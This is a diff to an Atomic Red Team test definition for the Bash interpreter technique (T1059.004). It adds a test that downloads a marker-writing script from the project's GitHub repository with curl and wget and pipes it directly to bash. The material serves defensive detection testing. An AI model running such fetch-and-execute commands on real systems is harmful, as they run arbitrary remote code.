@@ -1,6 +1,6 @@
 attack_technique:
 - T1059.004
-display_name: Scripting
+display_name: 'Command and Scripting Interpreter: Bash'
 atomic_tests:
 - name: Create and Execute Bash Shell Script
   description: |
@@ -44,4 +44,18 @@ atomic_tests:
     cleanup_command: |
       Remove-Item #{script_path} -Force -ErrorAction Ignore
     name: powershell
+- name: Command-Line Interface
+  description: |
+    Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.
 
+    Upon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.
+  supported_platforms:
+  - macos
+  - linux
+  executor:
+    command: |
+      curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/echo-art-fish.sh | bash
+      wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/echo-art-fish.sh | bash
+    cleanup_command: |
+      rm /tmp/art-fish.txt
+    name: sh
